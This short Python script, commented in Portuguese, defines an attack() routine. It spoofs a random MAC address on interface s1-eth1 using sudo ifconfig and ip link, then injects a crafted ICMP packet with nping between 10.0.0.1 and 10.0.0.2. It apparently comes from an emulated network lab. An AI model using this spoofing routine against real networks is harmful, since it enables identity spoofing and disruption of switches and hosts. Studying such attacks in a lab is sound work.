#-*-coding: utf-8-*-
from subprocess import Popen, PIPE
import random

def attack():
    for k in range(1):
        # Gera endereço mac aleatório.
        mac = rand_mac()
        # Derruba interface de rede.
        cmd1 = "sudo ifconfig s1-eth1 down"
        p1 = Popen(cmd1.split(),stdin=PIPE)
        p1.wait()
        # Faz link da interface com o novo endereço mac.
        cmd2 = "sudo ip link set s1-eth1 address {0}".format(mac)
        p2 = Popen(cmd2.split(),stdin=PIPE)
        p2.wait()
        # Sobe a nova interface.
        cmd3 = "sudo ifconfig s1-eth1 up"
        p3 = Popen(cmd3.split(),stdin=PIPE)
        p3.wait()
        # Faz o ping
        command = "sudo nping -icmp -c 1 -icmp-type 0 -dest-ip 10.0.0.2 -source-ip 10.0.0.1 -icmp-id 0 -icmp-seq 1 -source-mac {0} -dest-mac c6:bc:0a:eb:d9:06".format(mac)
        p4 = Popen(command.split(), stdin=PIPE)    

def rand_mac():
    return "%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
        )

attack()